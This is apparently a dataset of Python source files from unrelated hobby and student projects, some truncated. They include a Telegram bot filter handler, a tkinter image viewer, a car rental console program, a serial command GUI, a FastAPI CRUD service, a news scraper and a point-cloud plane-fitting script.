    "from enum import Enum, auto\nfrom AarohiX import app\nfrom pyrogram.types import InlineKeyboardMarkup, Message\nfrom AarohiX.utils.msg_types import button_markdown_parser\nfrom AarohiX.utils.function.notes_func import NoteFillings\nfrom emojis import decode\nfrom pyrogram.types import Message\n\n\nasync def SendFilterMessage(message: Message, filter_name: str, content: str, text: str, data_type: int):\n    \n    chat_id = message.chat.id\n    message_id = message.id\n    text, buttons = button_markdown_parser(text)\n    \n    text = NoteFillings(message, text)\n    reply_markup = None\n    if len(buttons) > 0:\n        reply_markup = InlineKeyboardMarkup(buttons)\n    else:\n        reply_markup = None\n\n    if data_type == 1:\n        await app.send_message(\n            chat_id=chat_id,\n            text=text,\n            reply_markup=reply_markup,\n            reply_to_message_id=message_id\n        )\n\n    elif data_type == 2:\n        await app.send_sticker(\n            chat_id=chat_id,\n            sticker=content,\n            reply_markup=reply_markup,\n            reply_to_message_id=message_id\n        )\n        \n    elif data_type ==3:\n        await app.send_animation(\n            chat_id=chat_id,\n            animation=content,\n            reply_markup=reply_markup,\n            reply_to_message_id=message_id\n        )\n\n    elif data_type == 4:\n        await app.send_document(\n            chat_id=chat_id,\n            document=content,\n            caption=text,\n            reply_markup=reply_markup,\n            reply_to_message_id=message_id\n        )\n\n    elif data_type == 5:\n        await app.send_photo(\n            chat_id=chat_id,\n            photo=content,\n            caption=text,\n            reply_markup=reply_markup,\n            reply_to_message_id=message_id\n        )\n    \n    elif data_type == 6:\n        await app.send_audio(\n            chat_id=chat_id,\n            audio=content,\n            caption=text,\n            reply_markup=reply_markup,\n            reply_to_message_id=message_id\n        )\n    \n    elif data_type == 7:\n        await app.send_voice(\n            chat_id=chat_id,\n            voice=content,\n            caption=text,\n            reply_markup=reply_markup,\n            reply_to_message_id=message_id\n        )\n    \n    elif data_type == 8:\n        await app.send_video(\n            chat_id=chat_id,\n            video=content,\n            caption=text,\n            reply_markup=reply_markup,\n            reply_to_message_id=message_id\n        )\n    \n    elif data_type == 9:\n        await app.send_video_note(\n            chat_id=chat_id,\n            video_note=content,\n            reply_markup=reply_markup,\n            reply_to_message_id=message_id\n        )\n\n\nclass FilterMessageTypeMap(Enum):\n    text = auto()\n    sticker = auto()\n    animation= auto()\n    document = auto()\n    photo = auto()\n    audio = auto()\n    voice = auto()\n    video = auto()\n    video_note = auto()\n\nasync def GetFIlterMessage(message):\n    data_type = None\n    content = None\n    text = str()\n\n    raw_text = message.text or message.caption\n    args = raw_text.split(None, 2)\n        \n    if len(args) >= 3 and not message.reply_to_message:\n        text = message.text.markdown[len(message.command[0]) + len(message.command[1]) + 4 :]\n        data_type = FilterMessageTypeMap.text.value\n\n    if (\n        message.reply_to_message\n        and message.reply_to_message.text\n    ):\n        if len(args) >= 2:\n            text = message.reply_to_message.text.markdown\n            data_type = FilterMessageTypeMap.text.value\n            \n    elif (\n        message.reply_to_message\n        and message.reply_to_message.sticker\n    ):\n        content = message.reply_to_message.sticker.file_id\n        data_type = FilterMessageTypeMap.sticker.value\n    \n    elif (\n        message.reply_to_message\n        and message.reply_to_message.animation\n    ):\n        content = message.reply_to_message.animation.file_id\n        if message.reply_to_message.caption:\n            text = message.reply_to_message.caption.markdown\n        data_type = FilterMessageTypeMap.animation.value\n        \n    elif (\n        message.reply_to_message\n        and message.reply_to_message.document\n    ):\n        content = message.reply_to_message.document.file_id\n        if message.reply_to_message.caption: \n            text = message.reply_to_message.caption.markdown \n        data_type = FilterMessageTypeMap.document.value\n\n    elif (\n        message.reply_to_message\n        and message.reply_to_message.photo\n    ):\n        content = message.reply_to_message.photo.file_id\n        if message.reply_to_message.caption:\n            text = message.reply_to_message.caption.markdown\n        data_type = FilterMessageTypeMap.photo.value\n\n    elif (\n        message.reply_to_message\n        and message.reply_to_message.audio\n    ):\n        content = message.reply_to_message.audio.file_id\n        if message.reply_to_message.caption:\n            text = message.reply_to_message.caption.markdown \n    ",
    "from cmu_graphics import * # type: ignore | the type ignore makes VSC's PyLance SHUT!\r\n\r\n# put data in-between brackets\r\npixels = []\r\n\r\n# code\r\nfrom math import floor, ceil\r\nfrom time import time\r\n\r\npalette = []\r\n\r\ndef progress(i: float, seconds: float = -1):\r\n    length = 30\r\n    percent = str(rounded(i * 100))\r\n    minutes = floor(seconds / 60)\r\n    start = f\" {(\" \" * (3 - len(percent)))}{percent}% [{\"\u2588\" * rounded(i * length)}{\"\u2591\" * rounded(length - (i * length))}] \"\r\n    if seconds > 0:\r\n        print(f\"{start}{minutes}m {seconds % 60:.2f}s    \", end=\"\\r\")\r\n    else:\r\n        print(start, end=\"\\r\")\r\n\r\n# get width/height\r\nwidth = pixels.pop(0)\r\nheight = pixels.pop(0)\r\ncolors = pixels.pop(0)\r\n\r\nstart = time()\r\nprint(\"Getting colors...\")\r\nfor i in range(colors):\r\n    timeProgressed = time() - start\r\n    percent = i / colors + .0001\r\n    timeRemaining = timeProgressed * (1 / (percent) - 1)\r\n    progress(percent, timeRemaining)\r\n    color = pixels.pop(0)\r\n    palette.append(rgb(color[0], color[1], color[2]))\r\nprint()\r\narea = width * height\r\n\r\n# loop\r\napp.setMaxShapeCount(width * height)\r\napp.pixel_counter = 0\r\n\r\n# rounded because it's cmu's python round, aparently \"round\" doesn't do what you would expect?\r\noffsetx = rounded(1 / width  * 400) # scale with image size; ex: image 400 is (1/400*400) is 1, so 1 pixel on the image is 1 pixel  on the canvas\r\noffsety = rounded(1 / height * 400) #                        ex: image 200 is (1/200*400) is 2, so 1 pixel on the image is 2 pixels on the canvas\r\n\r\ndef clamp(a, mi, ma):\r\n    return max(mi, min(a, ma))\r\n\r\ndef draw_pixels(color_index, count):\r\n    color = palette[color_index]\r\n    \r\n    for i in range(count):\r\n        x = floor(app.pixel_counter / height)\r\n        y = app.pixel_counter % height\r\n        app.pixel_counter += 1\r\n        Rect(x * offsetx, y * offsety, clamp(ceil(offsetx), 1, 99999999999999), clamp(ceil(offsety), 1, 999999999), fill=color)\r\n    \r\n    #print(x, y, \"         \", end='\\r')\r\n    #Rect(rounded(x * offsetx), rounded(y * offsety), offsetx, rounded(offsety * count), fill=color) # impliactions, would be better but i'd have to modify the generate.py to start new thing on new column\r\n\r\nstart = time()\r\nprint(\"Printing pixels...\")\r\nfor i in range(0, len(pixels), 2):\r\n    timeProgressed = time() - start\r\n    percent = i / len(pixels) + .0001\r\n    timeRemaining = timeProgressed * (1 / (percent) - 1)\r\n    progress(percent, timeRemaining)\r\n    color = pixels[i]#x * width + x * 2 + y    ]\r\n    count = pixels[i + 1]#x * width + x * 2 + y + 1]\r\n    \r\n    draw_pixels(color, count)\r\nprint()\r\n\r\n#print(palette)\r\ncmu_graphics.run() # type: ignore\r\n",
    "import subprocess\r\nimport requests\r\nfrom PIL import Image, ImageTk\r\nimport tkinter as tk\r\nfrom io import BytesIO\r\n\r\n\r\ndef upgrade_pip():\r\n    try:\r\n        subprocess.check_call([\"python\", \"-m\", \"pip\", \"install\", \"--upgrade\", \"pip\"])\r\n        print(\"pip has been upgraded successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while upgrading pip:\", e)\r\n\r\n\r\ndef upgrade_pillow():\r\n    try:\r\n        subprocess.check_call([\"pip\", \"install\", \"--upgrade\", \"pillow\"])\r\n        print(\"Pillow has been upgraded successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while upgrading Pillow:\", e)\r\n\r\n\r\ndef upgrade_beautifulsoup():\r\n    try:\r\n        subprocess.check_call([\"pip\", \"install\", \"--upgrade\", \"beautifulsoup4\"])\r\n        print(\"BeautifulSoup has been upgraded successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while upgrading BeautifulSoup:\", e)\r\n\r\n\r\ndef fetch_latest_image_url(url):\r\n    return url\r\n\r\n\r\nclass ImageViewer:\r\n    def __init__(self, root, urls_and_names):\r\n        self.root = root\r\n        self.root.title(\"Sun Viewer\")\r\n\r\n        self.urls_and_names = urls_and_names\r\n        self.selected_url = tk.StringVar(root, \"\")\r\n        self.refresh_interval = tk.StringVar(root, \"5 minutes\")  # Default refresh interval is 5 minutes\r\n        self.zoom_factor = 1.0\r\n\r\n        self.create_widgets()\r\n\r\n    def create_widgets(self):\r\n        # Dropdown menu for image selection\r\n        self.image_selection_menu = tk.OptionMenu(self.root, self.selected_url, *self.urls_and_names.keys(),\r\n                                                  command=self.load_selected_image)\r\n        self.image_selection_menu.pack(side=\"top\", pady=10)\r\n\r\n        # Display the image\r\n        self.img_label = tk.Label(self.root)\r\n        self.img_label.pack(expand=True, fill=\"both\")  # Image takes all available space\r\n\r\n        # Create a frame for the widget options\r\n        self.widget_frame = tk.Frame(self.root)\r\n        self.widget_frame.pack(side=\"top\", pady=10)  # Pack the frame at the top with some padding\r\n\r\n        # Label to display current zoom percentage\r\n        self.zoom_label_var = tk.StringVar(self.widget_frame, \"100%\")\r\n        self.zoom_label = tk.Label(self.widget_frame, textvariable=self.zoom_label_var)\r\n        self.zoom_label.pack(side=\"left\", padx=10)\r\n\r\n        # Label to indicate scrolling for adjustment\r\n        self.scroll_label = tk.Label(self.widget_frame, text=\"Scroll to adjust\")\r\n        self.scroll_label.pack(side=\"right\", padx=10)\r\n\r\n        # Dropdown menu for refresh interval\r\n        refresh_options = [\"1 minute\", \"2 minutes\", \"5 minutes\", \"10 minutes\"]\r\n        self.refresh_interval_menu = tk.OptionMenu(self.widget_frame, self.refresh_interval, *refresh_options)\r\n        self.refresh_interval_menu.pack(side=\"left\", padx=10)\r\n\r\n        # Refresh button\r\n        self.refresh_button = tk.Button(self.widget_frame, text=\"Refresh\", command=self.refresh_image)\r\n        self.refresh_button.pack(side=\"right\", padx=10)\r\n\r\n        # Bind mousewheel event for zooming\r\n        self.root.bind(\"<MouseWheel>\", self.zoom_image)\r\n\r\n        # Load the first image by default\r\n        self.load_selected_image()\r\n\r\n    def load_selected_image(self, *args):\r\n        selected_name = self.selected_url.get()\r\n        selected_url = self.urls_and_names.get(selected_name, \"\")\r\n        if selected_url:\r\n            image_data = requests.get(selected_url).content\r\n            image = Image.open(BytesIO(image_data))\r\n            self.rendered_image = image\r\n            photo = ImageTk.PhotoImage(image)\r\n            self.img_label.configure(image=photo)\r\n            self.img_label.image = photo\r\n            self.zoom_factor = 1.0\r\n            self.update_zoom_label()\r\n\r\n    def zoom_image(self, event):\r\n        # Zoom in or out based on mouse wheel movement\r\n        if event.delta > 0:\r\n            self.zoom_factor *= 1.1  # Zoom in\r\n        else:\r\n            self.zoom_factor /= 1.1  # Zoom out\r\n\r\n        # Apply zoom to the image\r\n        width = int(self.rendered_image.width * self.zoom_factor)\r\n        height = int(self.rendered_image.height * self.zoom_factor)\r\n        resized_image = self.rendered_image.resize((width, height), Image.LANCZOS)\r\n        photo = ImageTk.PhotoImage(resized_image)\r\n        self.img_label.configure(image=photo)\r\n        self.img_label.image = photo\r\n        self.update_zoom_label()\r\n\r\n    def update_zoom_label(self):\r\n        # Update the zoom label with the current zoom percentage\r\n        zoom_percentage = int(self.zoom_factor * 100)\r\n        self.zoom_label_var.set(f\"{zoom_percentage}%\")\r\n\r\n    def refresh_image(self):\r\n        new_interval = self.refresh_interval.get().split()[0]  # Extract the interval value (e.g., \"5\")\r\n        interval_seconds = int(new_interval) * 60 * 1000  # Convert to milliseconds\r\n        self.root.after(interval_seconds, self.refresh_image)  # Schedule the next refresh\r\n        self.load_selected_image()\r",
    "# VARIABLES\nmarcas = [\"toyota\", \"nissan\", \"subaru\",\"toyota\",\"ford\"]\nmarca_unique = []\nmodelos = [\"yaris\",\"altima\",\"wrx\",\"supra\",\"fiesta\"]\nmodelo_unique = []\nyears = [\"2012\",\"2008\",\"2010\",\"1990\",\"2005\"]\nyear_unique = []\ncc = [\"1500cc\",\"2500cc\",\"2400cc\",\"3000cc\",\"2000cc\"]\ncc_unique = []\nstate = [\"Disponible\",\"Disponible\",\"Disponible\",\"Disponible\",\"Disponible\"]\nprice_ad = []\nprice_car = []\n\nsedes_horarios = {\n    1: {\"nombre\": \"San Jos\u00e9\", \"horario\": \"24 horas, los 7 d\u00edas de la semana\"},\n    2: {\"nombre\": \"Alajuela\", \"horario\": \"24 horas, los 7 d\u00edas de la semana\"},\n    3: {\"nombre\": \"Guanacaste\", \"horario\": \"Abren a las 4 am, cierran a las 11 pm\"},   # Diccionario que contiene la informaci\u00f3n sobre las sedes y los horarios en los que operan\n    4: {\"nombre\": \"Lim\u00f3n\", \"horario\": \"Abren a las 6 am, cierran a las 10 pm\"},\n    5: {\"nombre\": \"Puntarenas\", \"horario\": \"Abren a las 5 am, cierran a las 10 pm\"},\n    6: {\"nombre\": \"P\u00e9rez Zeled\u00f3n\", \"horario\": \"Abren a las 7 am, cierran a las 10 pm\"}\n}\n\n\n# DATOS COLOCADOS ACA SOLAMENTE SON PRUEBAS\ndef visualizar_carros():\n    # Proyecto final\n    # Vizualizar vehiculos\n    marca1 = \"toyota\"          # Las marcas y modelos son como ejemplo\n    marca2 = \"nissan\"\n    marca3 = \"hyundai\"\n\n    # Marca 1\n    modelo_t1 = \"yaris\"\n    modelo_tc1 = 1\n    modelo_t2 = \"corolla\"\n    modelo_tc2 = 0\n    modelo_t3 = \"tacoma\"\n    modelo_tc3 = 0\n\n    # Marca 2\n    modelo_n1 = \"kicks\"\n    modelo_nc1 = 0\n    modelo_n2 = \"murano\"\n    modelo_nc2 = 0\n    modelo_n3 = \"rogue\"\n    modelo_nc3 = 0\n\n    # Marca 3\n    modelo_h1 = \"santaFe\"\n    modelo_hc1 = 0\n    modelo_h2 = \"tucson\"\n    modelo_hc2 = 0\n    modelo_h3 = \"venue\"\n    modelo_hc3 = 0\n\n    marca = input(\"Ingrese la marca del vehiculo que desea ver:\")\n\n    if marca == marca1:\n        print(\"Disponibilidad de\", marca1)\n        print(marca1, modelo_t1, modelo_tc1)\n        print(marca1, modelo_t2, modelo_tc2)      # en inventario deberia ir cantidad de marcas y cantidad de cada tipo de modelo o se podria establecer una cantidad de modelos en variables\n        print(marca1, modelo_t3, modelo_tc3)\n    \n    elif marca == marca2:\n        print(\"Disponibilidad de\", marca2)\n        print(marca2, modelo_n1, modelo_nc1)\n        print(marca2, modelo_n2, modelo_nc2)\n        print(marca2, modelo_n3, modelo_nc3)\n    \n    elif marca == marca3:\n        print(\"Disponibilidad de\", marca3)\n        print(marca3, modelo_h1, modelo_hc1)\n        print(marca3, modelo_h2, modelo_hc2)\n        print(marca3, modelo_h3, modelo_hc3)\n\n    selec_marca = input(\"Digite el nombre de la marca que desea retirar:\")\n    if selec_marca == \"toyota\":\n        selec_model = input(\"Ingrese el nombre del modelo que desea retirar:\")\n        if selec_model == modelo_t1 and modelo_tc1 == 0:\n            print(\"Disculpe el modelo\", modelo_t1, \"no est\u00e1 disponible\")\n        elif selec_model == modelo_t1 and modelo_tc1 > 0:\n            print(\"El modelo est\u00e1 disponible\")\n            model_reserva = selec_model\n            modelo_tc1 -= 1\n            print(\"reservo,\", marca1, selec_model)\n        elif selec_model == modelo_t2 and modelo_tc2 == 0:\n            print(\"Disculpe el modelo\", modelo_t2, \"no est\u00e1 disponible\")\n        elif selec_model == modelo_t2 and modelo_tc2 > 0:\n            print(\"El modelo est\u00e1 disponible\")\n            model_reserva = selec_model\n            modelo_tc2 -= 1\n            print(\"reserv\u00f3,\", marca1, selec_model)\n        elif selec_model == modelo_t3 and modelo_tc3 == 0:\n            print(\"Disculpe el modelo\", modelo_t3, \"no est\u00e1 disponible\")\n        elif selec_model == modelo_t3 and modelo_tc3 > 0:\n            print(\"El modelo est\u00e1 disponible\")\n            model_reserva = selec_model\n            modelo_tc3 -= 1\n            print(\"reserv\u00f3,\", marca1, selec_model)\n        \n    elif selec_marca == \"nissan\":\n        selec_model = input(\"Ingrese el nombre del modelo que desea retirar:\")\n        if selec_model == modelo_n1 and modelo_nc1 == 0:\n            print(\"Disculpe el modelo\", modelo_n1, \"no est\u00e1 disponible\")\n        elif selec_model == modelo_n1 and modelo_nc1 > 0:\n            print(\"El modelo est\u00e1 disponible\")\n            model_reserva = selec_model\n            modelo_nc1 -= 1\n            print(\"reserv\u00f3,\", marca2, selec_model)\n        elif selec_model == modelo_n2 and modelo_nc2 == 0:\n            print(\"Disculpe el modelo\", modelo_n2, \"no est\u00e1 disponible\")\n        elif selec_model == modelo_n2 and modelo_nc2 > 0:\n            print(\"El modelo est\u00e1 disponible\")\n            model_reserva = selec_model\n            modelo_nc2 -= 1\n            print(\"reserv\u00f3,\", marca2, selec_model)\n        elif selec_model == modelo_n3 and modelo_nc3 == 0:\n            print(\"Disculpe el modelo\", modelo_n3, \"no est\u00e1 disponible\")\n        elif selec_model == modelo_n3 and modelo_nc3 > 0:\n            print(\"El modelo est\u00e1 disponible\")\n            model_reserva = selec_model\n            modelo_nc3 -= 1\n            print(\"reserv\u00f3,\", marca2, selec_model)\n        \n    elif selec_marca == \"hyundai\":\n        ",
    "#Distributed under MIT license.\n#Copyright \u00a92024 \u5b59\u4f69\u4e1c\n#https://github.com/10032-bili/Serial-Command-Tool/\nimport tkinter as tk\nfrom tkinter import ttk, filedialog\nimport threading\nimport serial\nfrom serial.tools import list_ports\nimport json\nimport time\nclass SerialCommandAPP:\n    def __init__(self, master):\n        self.master = master\n        master.title('Serial tool v1.0 developed by \u00a9\u5b59\u4f69\u4e1c 2024')\n        # \u7ba1\u7406\u7a0b\u5e8f\u6267\u884c\u7684\u7ebf\u7a0b\u5217\u8868\n        self.program_threads = []\n        self.thread = None  # \u521d\u59cb\u5316\u7ebf\u7a0b\u5c5e\u6027\n\n        # \u521b\u5efa\u754c\u9762\u5207\u6362\u9009\u62e9\u680f\n        self.mode_var = tk.StringVar()\n        self.mode_var.set(\"serial_command_execution\")  # \u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u4e32\u53e3\u547d\u4ee4\u6267\u884c\u6a21\u5f0f\n        self.mode_selector = ttk.Combobox(master, textvariable=self.mode_var, values=[\"serial_command_execution\", \"command_editing\"])\n        self.mode_selector.grid(row=0, column=0, columnspan=2, padx=10, pady=10, sticky=\"ew\")\n        self.mode_selector.bind(\"<<ComboboxSelected>>\", self.switch_mode)\n\n        # \u4e32\u53e3\u547d\u4ee4\u6267\u884c\u6846\u67b6\n        self.serial_command_execution_frame = ttk.Frame(master)\n        self.serial_command_execution_frame.grid(row=1, column=0, columnspan=2)\n        self.create_serial_command_execution_ui(self.serial_command_execution_frame)\n\n        # \u547d\u4ee4\u7f16\u8f91\u6846\u67b6\n        self.command_editing_frame = ttk.Frame(master)\n        self.command_editing_frame.grid(row=1, column=0, columnspan=2)\n        self.create_command_editing_ui(self.command_editing_frame)\n        self.command_editing_frame.grid_remove()\n\n        # \u8bbe\u7f6e\u5173\u95ed\u4e8b\u4ef6\u5904\u7406\u5668\n        self.master.protocol(\"WM_DELETE_WINDOW\", self.on_closing)\n        \n    def create_serial_command_execution_ui(self, frame):\n        \"\"\"\u4e32\u53e3\u547d\u4ee4\u6267\u884c\u754c\u9762\"\"\"\n        frame.columnconfigure(0, weight=1)\n        frame.rowconfigure(0, weight=1)\n        self.serial_port = None\n        self.running = False\n        self.start_time = None  # \u521d\u59cb\u5316\u5f00\u59cb\u65f6\u95f4\u5c5e\u6027\n\n        # \u4e32\u53e3\u9009\u62e9\u4e0e\u626b\u63cf\u6309\u94ae\n        self.port_label = ttk.Label(frame, text=\"\u9009\u62e9\u4e32\u53e3:\")\n        self.port_label.grid(row=0, column=0)\n        self.port_combo = ttk.Combobox(frame)\n        self.port_combo.grid(row=0, column=1)\n        self.refresh_ports()\n\n        self.refresh_button = ttk.Button(frame, text=\"\u626b\u63cf\u4e32\u53e3\", command=self.refresh_ports)\n        self.refresh_button.grid(row=0, column=2)\n\n        # \u6ce2\u7279\u7387\u9009\u62e9\n        self.baudrate_label = ttk.Label(frame, text=\"\u6ce2\u7279\u7387:\")\n        self.baudrate_label.grid(row=0, column=3)\n        self.baudrate_combo = ttk.Combobox(frame, values=[2400, 9600, 19200, 38400, 57600, 115200], state=\"readonly\")\n        self.baudrate_combo.grid(row=0, column=4)\n        self.baudrate_combo.set(\"19200\")\n\n        self.start_button = ttk.Button(frame, text=\"\u542f\u52a8\", command=self.start_serial)\n        self.start_button.grid(row=0, column=5)\n\n        # \u6dfb\u52a0\u6587\u672c\u8f93\u5165\u6846\n        self.input_text = ttk.Entry(frame)\n        self.input_text.grid(row=5, column=1, columnspan=6, padx=10, pady=10)\n\n        # \u6dfb\u52a0\u53d1\u9001\u6309\u94ae\n        self.send_button = ttk.Button(frame, text='\u53d1\u9001', command=self.send_serial)\n        self.send_button.grid(row=5, column=6, columnspan=2)\n\n        # \u6587\u672c\u6846\u7528\u4e8e\u663e\u793a\u4e32\u53e3\u6570\u636e\n        self.serial_output_text = tk.Text(frame, height=15, width=50)\n        self.serial_output_text.grid(row=7, column=0, columnspan=8, padx=10, pady=10)\n\n        self.select_file_button = ttk.Button(frame, text=\"\u9009\u62e9JOSN\u6587\u4ef6\", command=self.select_program_file)\n        self.select_file_button.grid(row=6, column=2, padx=10, pady=10)\n        # \u5f00\u59cb\u6267\u884c\u6309\u94ae\n        self.btn_execute = ttk.Button(frame, text=\"\u5f00\u59cb\u6267\u884c\", command=self.execute_program)\n        self.btn_execute.grid(row=6, column=3, padx=10, pady=10)\n\n        # \u7248\u6743\u4fe1\u606f\u6807\u7b7e\n        self.footer_label = ttk.Label(frame, text=\"Copyright \u00a92024 \u5b59\u4f69\u4e1c. All Rights Reserved.\", background=\"gray\", foreground=\"white\")  \n        self.footer_label.grid(row=10, column=0, columnspan=8, sticky=\"ew\", pady=(10,0))\n\n        # \u8bbe\u7f6e\u884c\u5217\u6743\u91cd\u4ee5\u81ea\u9002\u5e94\u7a97\u53e3\u5927\u5c0f\n        for i in range(8):\n            frame.columnconfigure(i, weight=1)\n        for i in range(7):\n            frame.rowconfigure(i, weight=1)\n\n    def switch_mode(self, event=None):\n        \"\"\"\u5207\u6362\u754c\u9762\u6a21\u5f0f\"\"\"\n        if self.mode_var.get() == \"serial_command_execution\":\n            self.serial_command_execution_frame.grid()\n            self.command_editing_frame.grid_remove()\n        elif self.mode_var.get() == \"command_editing\":\n            self.serial_command_execution_frame.grid_remove()\n            self.command_editing_frame.grid()\n\n    def select_program_file(self):\n        \"\"\"\u9009\u62e9\u7a0b\u5e8f\u6587\u4ef6\u5e76\u52a0\u8f7d\u6307\u4ee4\"\"\"\n        self.file_path = filedialog.askopenfilename(title=\"\u9009\u62e9\u7a0b\u5e8f\u6587\u4ef6\", filetypes=[(\"JSON Files\", \"*.json\")])\n        if self.file_path:\n            self.serial_output_text.delete('1.0', tk.END)\n            self.program_data = self.load_instructions(self.file_path)\n            self.serial_output_text.insert(tk.END, f\"\u9009\u5b9a\u6587\u4ef6: {self.file_path}\\n\")\n\n    def load_instructions(self, file_path):\n        \"\"\"\u4ece\u6587\u4ef6\u4e2d\u52a0\u8f7d\u6307\u4ee4\u5217\u8868\"\"\"\n        with open(file_path, 'r') as file:\n            return json.load(file)\n            \n    def execute_program(self):\n        \"\"\"\u5f02\u6b65\u6267\u884c\u7a0b\u5e8f\u5e76\u66f4\u65b0GUI\"\"\"\n        if not self.program_data:\n            self.serial_output_text.insert(tk.END, \"\u7a0b",
    "from fastapi import FastAPI, HTTPException, Depends, status\r\nfrom pydantic import BaseModel\r\nfrom typing import Annotated\r\nimport models \r\nfrom database import engine, SessionLocal\r\nfrom sqlalchemy.orm import Session\r\n\r\napp = FastAPI()\r\n\r\nmodels.Base.metadata.create_all(bind=engine)\r\n\r\nclass CharacterBase(BaseModel):\r\n    name: str\r\n    level: int\r\n    class_name: str\r\n    starting_gift: str\r\n    covenant: str\r\n\r\n\r\nclass ItemBase(BaseModel):\r\n    name: str\r\n    type: str\r\n    description: str\r\n    required_level: int\r\n    required_class: str\r\n\r\n\r\nclass ItemCreate(ItemBase):\r\n    pass\r\n\r\n\r\n# Dependency\r\ndef get_db():\r\n    db = SessionLocal()\r\n    try:\r\n        yield db\r\n    finally:\r\n        db.close()\r\n\r\ndb_dependency = Annotated[Session, Depends(get_db)]\r\n\r\n@app.post(\"/items/\", status_code=status.HTTP_201_CREATED)\r\nasync def create_item(item: ItemBase, db: db_dependency):\r\n    db_item = models.Item(**item.dict())\r\n    db.add(db_item)\r\n    db.commit()\r\n\r\n\r\n@app.get(\"/items/{item_id}\", status_code=status.HTTP_200_OK)\r\nasync def read_item(item_id: int, db: db_dependency):\r\n    item = db.query(models.Item).filter(models.Item.id == item_id).first()\r\n    if item is None:\r\n        HTTPException(status_code=404, detail='Item not found')\r\n    return item\r\n\r\n\r\n@app.delete(\"/items/{item_id}\", status_code=status.HTTP_200_OK)\r\nasync def delete_item(item_id: int, db: db_dependency):\r\n    db_item = db.query(models.Item).filter(models.Item.id == item_id).first()\r\n    if db_item is None:\r\n        raise HTTPException(status_code=404, detail='Item was not found')\r\n    db.delete(db_item)\r\n    db.commit()\r\n\r\n\r\n@app.post(\"/characters/\", status_code=status.HTTP_201_CREATED)\r\nasync def create_character(character: CharacterBase, db: db_dependency):\r\n    db_character = models.Character(**character.dict())\r\n    db.add(db_character)\r\n    db.commit()\r\n\r\n\r\n@app.get(\"/characters/{character_id}\", status_code=status.HTTP_200_OK)\r\nasync def read_character(character_id: int, db: db_dependency):\r\n    character = db.query(models.Character).filter(models.Character.id == character_id).first()\r\n    if character is None:\r\n        raise HTTPException(status_code=404, detail='Character not found')\r\n    return character",
    "import re\nfrom bs4 import BeautifulSoup\nfrom parsel import Selector\nimport requests\nimport time\nfrom tech_news.database import create_news\n\n\n# Requisito 1\ndef fetch(url):\n    headers = {\"user-agent\": \"Fake user-agent\"}\n    time.sleep(1)\n    try:\n        response = requests.get(url, headers=headers, timeout=3)\n        if response.status_code == 200:\n            return response.text\n        else:\n            return None\n    except requests.exceptions.Timeout:\n        return None\n\n\n# Requisito 2\ndef scrape_updates(html_content):\n    selector = Selector(text=html_content)\n    news_urls = selector.xpath(\"//header/h2/a/@href\").getall()  # NOQA\n    return news_urls\n\n\n# Requisito 3\ndef scrape_next_page_link(html_content):\n    selector = Selector(text=html_content)\n    next_page_url = selector.xpath(\n        '//*[@id=\"main\"]/div/nav/div/a[3]/@href'\n    ).get()  # NOQA\n    return next_page_url\n\n\n# Requisito 4\ndef scrape_news(html_content):\n    soup = BeautifulSoup(html_content, \"html.parser\")\n\n    url = soup.find(\"link\", {\"rel\": \"canonical\"})[\"href\"]\n    title = soup.find(\"h1\", {\"class\": \"entry-title\"}).text.strip()\n    timestamp = soup.find(\"li\", {\"class\": \"meta-date\"}).text\n    writer = soup.find(\"span\", {\"class\": \"author\"}).a.text\n    reading_time_str = soup.find(\"li\", {\"class\": \"meta-reading-time\"}).text\n    reading_time_int = int(re.search(r\"\\d+\", reading_time_str).group())\n    summary = soup.find(\"div\", {\"class\": \"entry-content\"}).p.text.strip()\n    category = soup.find(\"span\", {\"class\": \"label\"}).text.strip()\n\n    return {\n        \"url\": url,\n        \"title\": title,\n        \"timestamp\": timestamp,\n        \"writer\": writer,\n        \"reading_time\": reading_time_int,\n        \"summary\": summary,\n        \"category\": category,\n    }\n\n\n# Requisito 5\ndef get_tech_news(amount):\n    url = \"https://blog.betrybe.com/\"\n    all_news = []\n\n    while len(all_news) < amount:\n        response = fetch(url)\n        news_links = scrape_updates(response)\n\n        for link in news_links:\n            news_content = fetch(link)\n            news_data = scrape_news(news_content)\n            all_news.append(news_data)\n\n            if len(all_news) == amount:\n                break\n\n        if len(all_news) < amount:\n            url = scrape_next_page_link(response)\n\n    create_news(all_news)\n    return all_news\n",
    "import open3d as o3d\nimport numpy as np\n\n\ndef calculate_residual(plane_model, inliers):\n    # Extracting coefficients\n    A, B, C, D = plane_model\n\n    # Calculate residual\n    residual = 0.0\n    num_inliers = len(inliers)\n\n    if num_inliers > 0:\n        for index in inliers:\n            if 0 <= index < len(points):\n                point = points[index]\n                x, y, z = point\n                distance_to_plane = abs(A * x + B * y + C * z + D) / np.sqrt(A**2 + B**2 + C**2)\n                residual += distance_to_plane\n            else:\n                print(\"Invalid index:\", index)\n        residual = np.sqrt(residual)\n\n    return residual\n\n\ndef evaluate_plane(coefficients, inliers):\n    result = {\"successful_fit\": False, \"residual_less_than_2cm\": False, \"slope_less_than_4_degrees\": False}\n\n    A, B, C, D = coefficients\n\n    # Calculating slope\n    slope = -A / C\n\n    # Calculating residual\n    result[\"successful_fit\"] = True\n    second_residual = calculate_residual(coefficients, inliers)\n    result[\"residual_less_than_2cm\"] = abs(second_residual) < 0.2  # 2cm threshold\n    result[\"slope_less_than_4_degrees\"] = slope < 4.0  # 4 degrees threshold\n\n    print(\"Slope is  \" + str(slope))  # for debugging\n    print(\"residual is \" + str(second_residual))  # for debugging\n\n    return result\n\n\n# Load point cloud\npcd = o3d.io.read_point_cloud(\"cloud.pcd\")\n\ndownpcd = pcd.voxel_down_sample(voxel_size=0.1)\n\nresolution = 0.02  # 2x2cm resolution\nvoxel_grid = o3d.geometry.VoxelGrid.create_from_point_cloud(downpcd, voxel_size=resolution)  # applying voxel filtering\n\nvoxel_points = {}\n\n# Iterate through points to assign them to appropriate voxel\nfor i in range(len(pcd.points)):\n    voxel_center = voxel_grid.get_voxel(pcd.points[i])\n    if tuple(voxel_center) not in voxel_points:\n        voxel_points[tuple(voxel_center)] = []\n    voxel_points[tuple(voxel_center)].append(i)\n\ngeometries = []  # List to hold colored planes\n\n# Iterate through voxels\nfor voxel_center, indices in voxel_points.items():\n    # Extract points within the voxel\n    points = np.asarray(pcd.points)[indices]\n\n    # Checking if enough points for plane fitting\n    if len(points) < 3:\n        continue\n\n    # Convert points to PointCloud object\n    voxel_pcd = o3d.geometry.PointCloud()\n    voxel_pcd.points = 